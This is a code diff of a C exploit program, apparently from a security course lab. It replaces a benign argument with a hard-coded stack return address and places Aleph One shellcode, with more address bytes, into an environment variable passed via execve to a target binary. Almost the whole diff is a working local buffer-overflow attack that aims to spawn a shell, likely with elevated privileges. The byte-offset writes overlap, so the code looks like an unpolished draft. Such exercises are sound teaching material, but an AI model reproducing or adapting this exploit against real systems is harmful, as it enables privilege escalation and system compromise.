@@ -13,10 +13,28 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
   
-  env[0] = NULL;
+  //0xbf ff ff db
+  args[1] = "\x9f\xff\xff\xbf"; 
+  
+  args[2] = NULL;
+  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
+  char att[sizeOfShell + 8];
+  
+  memset(att,'\xbf', 4*sizeof(char));  
+  memset(att+3,'\xbf', sizeof(char));  
+  memset(att+4,'\xff', sizeof(char));  
+  memset(att+5,'\xff', sizeof(char));  
+  memset(att+6,'\xa7', sizeof(char));  
+
+
+
+
+
+  //strcat(att , "\xbf\xff\xff\xe3");
+  memcpy(att+7 , shellcodeAlephOne , sizeOfShell*sizeof(char));
+  
+  env[0] = att;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
